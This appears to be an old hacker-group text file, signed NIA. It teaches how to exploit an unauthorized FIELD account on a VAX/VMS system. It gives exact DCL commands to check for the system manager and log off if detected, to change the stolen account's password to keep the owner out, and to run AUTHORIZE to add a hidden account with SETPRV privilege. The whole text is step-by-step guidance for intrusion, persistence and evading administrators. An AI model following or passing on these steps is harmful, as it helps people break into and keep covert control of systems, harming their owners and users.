I will be using the FIELD account for my tutorial.  The FIELD account has
SETPRV capability which means, that that particular account can create other
accounts and set its own privliges.  If the account which you have does NOT
have that capability you can NOT create (to my limited DCL Experience)
accounts.

The ($) Dollar Sign means that you are at the DCL Prompt or the DIGITAL
COMMAND LANGUAGE prompt. You have access to over 200+ Commands to do
virtually anything you want.  Assuming that your Account has the access.

Also keep an eye out when you log in, to see who-else is attempting to hack
that account.  The system will automatically tell you each time that you log
in, how many "Hack" attempts there have been attempted on that account.

[============================]

$_SHOW USERS


The VERY NEXT thing that you should do, is to check for other users.  This
is a very good habit to get into, for the following example will show you
WHY you should do so:

$SH USERS

VAX/VMS Interactive Users

Total number of interactive users = 6

Username       Process Name     PID              TERMINAL
FIELD          FIELD            000000AF         VTA89:
MANAGER        MANAGER          00000146         OPA0:

Notice that the MANAGER is on, now, depending on how active this person is,
or not, you MIGHT ( NOTICE MIGHT ), be able to slip by him and not be
detected, but I doubt that.  If you EVER see the MANAGER account on,
LO/HANGUP Imediately, that way, you can come back at a later time.

Also note that just because the MANAGER is on, it doesn't mean that he is
actually on the system.  The terminal can be logged on, and nothing
happening, some system managers do this, in an effert to scare hackers away.


[===========================]

$_PASSWORD CHANGE

Once you get yourself an account, be sure to CHANGE THE PASSWORD, this is
good to keep the other guy out or to make enough time to create yourself another
account or just so that it looks normal.  Some system managers may have DCL
set up to automatically change your PW after 30 days, so if you come across
something that says to change your password do it.  B/c if you do not change
your password, you will lock yourself out of the system.  Also make a note
that SOME accounts have a time period on them ( Univiversities SHOULD have
this, for thier students ), if you get ahold of such an account, make a note
that the system will NOT notify you that your account is about to go dead.

When changing your password make sure that the words you use, do NOT in any
way correspond to YOU.  Meaning that if you smoke do NOT use your brand of
cigarretes as a password.  You want to be as NON-DESCRIPTIVE as possible, so
as not to give the system manager any "clues" that maybe used against you
later on.

To change your password:

$ SET PASSWORD:
$ OLD PASSWORD: GUARDIAN
$ NEW PASSWORD: DREDD

The MANAGER account can determine how many characters YOUR password can be.
So if you get a message stating that  your password is not long enough you
should just make sure you have enough characters.  The message you would get
looks like this:

$SET PASS
Old password:
New password:
%SET-E-INVPWDLEN, minimum password length is 8; password not changed
$

You can also have the system generate a password for you.  The following
example shows how to change the password, for account FIELD with a password
length of eight.  There are only five passwords listed, what the system will
do is to list on the left the password and then on the right side is the
same password broken down into syllables.  Generaly the easier to say
(syllable wise) is the one chosen.

According to the manual (Page 3-9 Security For The User 3.1 Logging In to
the System ), there is a wonderful highlighted message that I think you will
get a kick out of:

NOTE: THE PASSWORD GENERATOR USES BASIC SYLLABIC RULES TO GENERATE WORDS,
BUT HAS NO REAL KNOWLEDGE OF ANY LANGUAGE.  AS A RESULT, IT MAY
UNINTENTIONALLY PRODUCE WORDS THAT ARE OFFENSIVE.

$_Creating User Accounts

To begin your creating of an account you must determine if you have SETPRV
capability, if you do not, then your wasting your time.  That is why it is
IMPERITIVE that you get an account with SETPRV privilege.

To find out if your account has SETPRV privilege, you just switch to the
SYS$SYSTEM directory and RUN AUTHORIZE, if you can run authorize, then you
should have the access.  But to be certain once you are in the UAF (User
Authorization File), you can then type SH FIELD/FULL (or SH username/FULL,
username would be the name of your account.) and look under privilege if you
have SETPRV your set, if not tough.  Basically with my limited knowledge that
is 'bout all I know, on how to check if you have access or not.  If there is a
quicker/better way, I do NOT know.  I only just started to dabble in the
Digital Command Language (DCL).

Once you have dialed into a system, and you are at the DCL prompt, just
follow the below format and you should have no problem.

$SET DEFAULT SYS$SYSTEM
$RUN AUTHORIZE
UAF> ADD NIA/PASSWORD="WAXYOLWOS" -
UAF> /DEVICE=SYS$SYSDEVICE/DIRECTORY=[SYS$SYSTEM] -
UAF> /PWDLIFETIME=30-/PWMINIMUM=8 -
UAF> /PRIVILEGES=SETPRV
%UAF-I-ADDMSG, user record successfully added
UAF> *EXIT*
%UAF-I-DONEMSG, system authorization file modified
%UAF-I-RDBNOMODS, Modifications made to rights database
$ LO/HANGUP

Username:
Username: NIA
password: xxxxxxxxx <- Passwords are NEVER echoed back to you by the system

Welcome to NIA... VAX/VMS Version 4.7

$

We will go over the UAF> section, since most of the rest seems easy enough
to follow and to handle.  UAF stands for User Authorization File.

$RUN AUTHORIZE
UAF> ADD NIA/PASSWORD="WAXYOLWOS" -

You are now creating you User Account, which is NIA and assigning yourself a
password that is nine digits long.  The - on the end, means more to follow.

UAF> /DEVICE=SYS$SYSDEVICE/DIRECTORY=[SYS$SYSTEM] -

Now you are assigning to your account a directory in which to create files.
That should be the root of the system, so there should be around 366 or more
files there.  Also if you do NOT assign yourself a directory, the system will
still let you log into it.  But you will not be able to create any files or
such, unless you are in a specific directory.

UAF> /PWLIFETIME=30-/PWMINIMUM=8 -

The password will automatically expire in thirty days.  The system will
notify you when your password is due for change.  If you do NOT change it,
you will be locked out of the system, till the manager re-assigns you a
password.  So if you are told to change a password DO IT.

The password length must be at least eight characters long.  Where the eight is
you can make that number whatever you want, just as long as you remember that
that is the MINIMUM length of your password.  The longer your password is, the
longer it is for you remember, write down, macro in, whatever.  Just remember
to keep that passsword.  If you lose it, you will in turn lock yourself out of
the system you are hacking.

UAF> /PRIVILEGES=SETPRV

This is the Privilege that you want.  The command SETPRV will allow your
account to activate any other privilege that there is.  This probably the
most dangerous command to give out.  Make sure your account has it.

UAF> *EXIT*

That is a control Z, and that will always let you out of the "program" and
back into DCL.

If your account does NOT have access to create an account (SETPRV Privilege)
and you attempt to create an account you will get the following error
message:

$SET DEFAULT SYS$SYSTEM
$RUN AUTHORIZE
%UAF-E-NAOFIL, unable to open SYSUAF.DAT
-RMS-E-PRV, insufficient privilege or file protection violation
$

Which means your NOT entering the UAF program.

[============================]

$_HINTS

Remember that if you are ever stuck just type the word HELP.  Vax's are
set up so that just about every command has its own HELP TOPIC.  Also you
might have seen files that show all of DCL's commands?  You can type the
command HELP *(return) and that will give you a list of all the HELP TOPICS
and what they cover.  Problem is, almost all HELP TOPICS have SUB HELP TOPICS,
and those are NOT listed when you do a HELP *.  Also some HELP TOPICS have
references and such, and those too, are not listed, unless, you specify it.

You do not have to type the entire command out, you can be pretty
descriptive and if you become to descriptive the system will tell you that
it doesn't recognize the command but for your references Commands can be
shortened, for example:

$SHOW USERS

Can be typed as:

$SH U

You need to SHO U often.  This way you will be able to LO/HANGUP if you see
the MANAGER account logged on.

Common Commands to use:

Control-Z := EXIT this will return you back to DCL Prompt ($)
Up/Down   := Repeat Last Command
SH U      := Show Users ( USE Periodically )
LO        := Logoff, you have three Qualifiers for logging off
HELP      := Help Topics, example HELP SHOW or HELP LOGOFF or HELP

$_NIA END OF FILE
